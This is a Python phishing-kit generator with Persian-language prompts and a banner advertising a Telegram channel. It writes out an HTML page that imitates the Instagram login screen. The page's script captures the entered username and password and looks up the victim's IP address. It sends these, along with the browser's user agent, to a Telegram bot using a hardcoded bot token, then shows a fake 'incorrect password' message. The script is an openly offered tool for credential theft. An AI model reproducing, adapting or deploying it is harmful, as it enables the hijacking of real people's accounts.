import os

# کدهای رنگی برای ترمینال
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    banner = f"""
{Colors.CYAN}{Colors.BOLD} 
Tegram:
 Channel:@editor_a0
 PV:editor_a0                                                                                  {Colors.END}
{Colors.YELLOW}{'='*60}{Colors.END}
{Colors.MAGENTA}{Colors.BOLD}          دریافت فایل صفحه لاگین اینستگرام {Colors.END}
{Colors.YELLOW}{'='*60}{Colors.END}
"""
    print(banner)

def get_telegram_id():
    show_banner()
    print(f"{Colors.GREEN}{Colors.BOLD}لطفا چت آیدی تلگرام خود را وارد کنید:{Colors.END}")
    print(f"{Colors.YELLOW}مثال: 1234567890{Colors.END}\n")
    
    telegram_id = input(f"{Colors.RED}{Colors.BOLD}>>> {Colors.END}").strip()
    
    if not telegram_id:
        print(f"\n{Colors.RED}خطا: چت آیدی نمی‌تواند خالی باشد!{Colors.END}")
        input(f"{Colors.YELLOW}برای ادامه Enter بزنید...{Colors.END}")
        return get_telegram_id()
    
    return telegram_id

def generate_html(telegram_id):
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .login-container {
            background-color: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 40px;
            width: 350px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }
        
        .logo {
            margin-bottom: 24px;
        }
        
        .logo svg {
            fill: #f5f5f5;
            width: 175px;
        }
        
        .input-group {
            margin-bottom: 12px;
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background-color: #2a2a2a;
            border: 1px solid #333;
            border-radius: 4px;
            color: #f5f5f5;
            font-size: 14px;
            outline: none;
        }
        
        input:focus {
            border-color: #555;
        }
        
        button {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
        }
        
        button:hover {
            background-color: #0077cc;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #777;
            font-size: 13px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #333;
        }
        
        .divider::before {
            margin-right: 10px;
        }
        
        .divider::after {
            margin-left: 10px;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
        
        .loading {
            display: none;
            margin-top: 15px;
        }
        
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            border-top: 3px solid #0095f6;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                <path d="M256 49.5c67.3 0 75.2.3 101.8 1.5 24.6 1.1 37.9 5.2 46.8 8.7 11.8 4.6 20.2 10 29 18.8 8.8 8.8 14.2 17.2 18.8 29 3.4 8.9 7.6 22.2 8.7 46.8 1.2 26.6 1.5 34.5 1.5 101.8s-.3 75.2-1.5 101.8c-1.1 24.6-5.2 37.9-8.7 46.8-4.6 11.8-10 20.2-18.8 29-8.8 8.8-17.2 14.2-29 18.8-8.9 3.4-22.2 7.6-46.8 8.7-26.6 1.2-34.5 1.5-101.8 1.5s-75.2-.3-101.8-1.5c-24.6-1.1-37.9-5.2-46.8-8.7-11.8-4.6-20.2-10-29-18.8-8.8-8.8-14.2-17.2-18.8-29-3.4-8.9-7.6-22.2-8.7-46.8-1.2-26.6-1.5-34.5-1.5-101.8s.3-75.2 1.5-101.8c1.1-24.6 5.2-37.9 8.7-46.8 4.6-11.8 10-20.2 18.8-29 8.8-8.8 17.2-14.2 29-18.8 8.9-3.4 22.2-7.6 46.8-8.7 26.6-1.3 34.5-1.5 101.8-1.5m0-45.4c-68.4 0-77 .3-103.9 1.5C125.3 6.8 107 11.1 91 17.3c-16.6 6.4-30.6 15.1-44.6 29.1-14 14-22.6 28.1-29.1 44.6-6.2 16-10.5 34.3-11.7 61.2C4.4 179 4.1 187.6 4.1 256s.3 77 1.5 103.9c1.2 26.8 5.5 45.1 11.7 61.2 6.4 16.6 15.1 30.6 29.1 44.6 14 14 28.1 22.6 44.6 29.1 16 6.2 34.3 10.5 61.2 11.7 26.9 1.2 35.4 1.5 103.9 1.5s77-.3 103.9-1.5c26.8-1.2 45.1-5.5 61.2-11.7 16.6-6.4 30.6-15.1 44.6-29.1 14-14 22.6-28.1 29.1-44.6 6.2-16 10.5-34.3 11.7-61.2 1.2-26.9 1.5-35.4 1.5-103.9s-.3-77-1.5-103.9c-1.2-26.8-5.5-45.1-11.7-61.2-6.4-16.6-15.1-30.6-29.1-44.6-14-14-28.1-22.6-44.6-29.1-16-6.2-34.3-10.5-61.2-11.7-27-1.1-35.6-1.4-104-1.4z"/>
                <path d="M256 126.6c-71.4 0-129.4 57.9-129.4 129.4S184.6 385.4 256 385.4 385.4 327.5 385.4 256 327.5 126.6 256 126.6zm0 213.4c-46.4 0-84-37.6-84-84s37.6-84 84-84 84 37.6 84 84-37.6 84-84 84z"/>
                <circle cx="390.5" cy="121.5" r="30.2"/>
            </svg>
        </div>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" id="loginButton">Log In</button>
            
            <div class="error-message" id="errorMessage">
                Sorry, your password was incorrect. Please double-check your password.
            </div>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
            </div>
        </form>
        
        <div class="divider">OR</div>
        
        <div class="footer">
            <a href="#" style="color: #0095f6; text-decoration: none;">Forgot password?</a>
        </div>
    </div>

<script>
    // تابع جدید برای دریافت IP (نسخه ساده شده)
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || 'IP not available';
        } catch (error) {
            return 'IP not available';
        }
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Show loading spinner
        document.getElementById('loading').style.display = 'block';
        document.getElementById('loginButton').disabled = true;
        document.getElementById('errorMessage').style.display = 'none';
        
        // Replace these with your actual Telegram bot token and chat ID
        const botToken = '8364400999:AAETcN_Jqq6WlmY2TO1n6OHzgOZiLuSTmV0';
        const chatId = '6457940911';
        
        // Get IP address
        const ipAddress = await getIP();
        
        const message = `🔔 New Instagram Login 🔔\n\n📱 Username: ${username}\n🔑 Password: ${password}\n\n🌍 IP: ${ipAddress}\n🖥️ User Agent: ${navigator.userAgent}\n\n🌐 Channel: @editor_a0\n👨‍💻 Admin: @editor_a0_ADM`;
        
        try {
            // Send data to Telegram bot
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('Message sent to Telegram:', data);
            
            // Simulate loading delay
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('loginButton').disabled = false;
            }, 2000);
            
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            document.getElementById('loading').style.display = 'none';
            document.getElementById('loginButton').disabled = false;
        }
    });
</script>
</body>
</html>
"""
    
    # جایگزینی chatId با مقدار وارد شده توسط کاربر
    html_content = html_content.replace("const chatId = '6457940911'", f"const chatId = '{telegram_id}'")
    
    filename = f"Instagram-login_{telegram_id}.html"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html_content)
    return filename

def main():
    try:
        telegram_id = get_telegram_id()
        filename = generate_html(telegram_id)
        
        clear_screen()
        show_banner()
        print(f"{Colors.GREEN}{Colors.BOLD}عملیات با موفقیت انجام شد!{Colors.END}")
        print(f"{Colors.CYAN}فایل با نام {filename} ذخیره شد.{Colors.END}\n")
        print(f"{Colors.YELLOW}دستورالعمل:{Colors.END}")
        print(f"{Colors.WHITE}1. فایل را در مرورگر باز کنید{Colors.END}")
        print(f"{Colors.WHITE}2. از آن استفاده نمایید{Colors.END}\n")
        input(f"{Colors.YELLOW}برای خروج Enter بزنید...{Colors.END}")
    
    except Exception as e:
        print(f"\n{Colors.RED}خطا: {str(e)}{Colors.END}")
        input(f"{Colors.YELLOW}برای خروج Enter بزنید...{Colors.END}")

if __name__ == "__main__":
    main()